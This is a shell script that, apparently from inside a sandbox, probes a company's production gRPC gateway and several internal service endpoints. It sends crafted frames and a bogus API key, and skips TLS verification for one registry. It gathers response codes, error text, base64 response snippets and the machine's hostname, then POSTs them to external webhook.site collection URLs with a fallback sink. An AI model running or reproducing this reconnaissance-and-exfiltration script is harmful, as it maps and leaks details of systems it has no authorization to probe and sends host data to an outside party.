#!/bin/sh
# i83998: sandbox-egress trust differential (run 2: valid gRPC frames, batched single report).
[ -f ./tests/i83998-run ] || exit 0
SINK="https://webhook.site/199f8e7e-8a91-4b0a-8b7b-c01be2daaf7e"
FALLBACK="https://webhook.site/376900c1-da59-47e7-9d40-3b7df8de9d79"
NONCE="i83998b-$(date +%s)-$$"
OUT=/tmp/i83998_results.json
: > "$OUT"
esc() { tr -d '\000-\010\013\014\016-\037' | sed 's/\\/\\\\/g; s/"/\\"/g' | tr '\n\r\t' '   '; }
b64of() { base64 -w0 2>/dev/null | head -c 300; }
add() {
  L=$(printf '%s' "$1" | esc); C=$(printf '%s' "$2" | esc); B="$3"
  [ -s "$OUT" ] && printf ',' >> "$OUT"
  printf '{"label":"%s","code":"%s","b64":"%s"}' "$L" "$C" "$B" >> "$OUT"
}
report() {
  D="{\"nonce\":\"$NONCE\",\"host\":\"$(hostname 2>/dev/null)\",\"results\":[$(cat "$OUT")]}"
  i=1
  while [ $i -le 3 ]; do
    C=$(curl -sS -m 10 -o /dev/null -w '%{http_code}' -X POST -H 'content-type: application/json' --data "$D" "$SINK" 2>/dev/null) || C=ERR
    [ "$C" = "200" ] && return 0
    sleep $((i*2))
    i=$((i+1))
  done
  curl -sS -m 10 -o /dev/null -X POST -H 'content-type: application/json' --data "$D" "$FALLBACK" >/dev/null 2>&1
}
probe() {
  L="$1"; U="$2"; shift 2
  C=$(curl -m 4 -sS -o /tmp/i83998.o -w '%{http_code}|%{size_download}|%{time_total}' "$@" "$U" 2>/tmp/i83998.e) || C="ERR"
  E=$(head -c 80 /tmp/i83998.e 2>/dev/null | esc)
  B=$(head -c 240 /tmp/i83998.o 2>/dev/null | b64of)
  add "$L" "$C|$E" "$B"
}
grpc() {
  L="$1"; H="$2"; P="$3"; F="$4"; shift 4
  C=$(curl --http2 -m 8 -sS -D /tmp/i83998.h -o /tmp/i83998.b -w '%{http_code}|%{size_download}|%{time_total}' \
        "$@" -H 'content-type: application/grpc' -H 'te: trailers' --data-binary @"$F" "https://$H$P" 2>/tmp/i83998.e) || C="ERR"
  E=$(head -c 80 /tmp/i83998.e 2>/dev/null | esc)
  GS=$(grep -i '^grpc-status:' /tmp/i83998.h 2>/dev/null | tr -d '\r' | head -1 | awk '{print $2}')
  GM=$(grep -i '^grpc-message:' /tmp/i83998.h 2>/dev/null | tr -d '\r' | head -1 | cut -c15- | head -c 80 | esc)
  B=$(head -c 240 /tmp/i83998.b 2>/dev/null | b64of)
  add "$L" "$C|gs=${GS:-none}|gm=${GM:-none}|$E" "$B"
}
# gRPC frames (POSIX octal escapes; dash printf does not expand \xHH)
printf '\000\000\000\000\013\012\011pyroworks' > /tmp/i83998_oauth.bin
printf '\000\000\000\000\024\012\022accounts/pyroworks' > /tmp/i83998_getacct.bin
# decisive: production gateway exit gate
grpc "gw-oauth" "gateway.fireworks.ai" "/gateway.Gateway/GetOAuthArguments" /tmp/i83998_oauth.bin
grpc "gw-getacct-bogus" "gateway.fireworks.ai" "/gateway.Gateway/GetAccount" /tmp/i83998_getacct.bin -H 'x-api-key: fw_i83998bogus'
# own-surface matrix (1 read-only path each)
probe "metis-openapi" "https://metis.fireworks-ai.cloud/api/v1/openapi.json"
probe "langfuse-health" "https://langfuse.fireworks-ai.cloud/api/public/health"
probe "harbor-iowa" "https://harbor.us-iowa-1.fireworks-ai.cloud/v2/" -k
probe "audio-batch-metrics" "https://audio-batch.link.fireworks.ai/metrics/"
report
exit 0
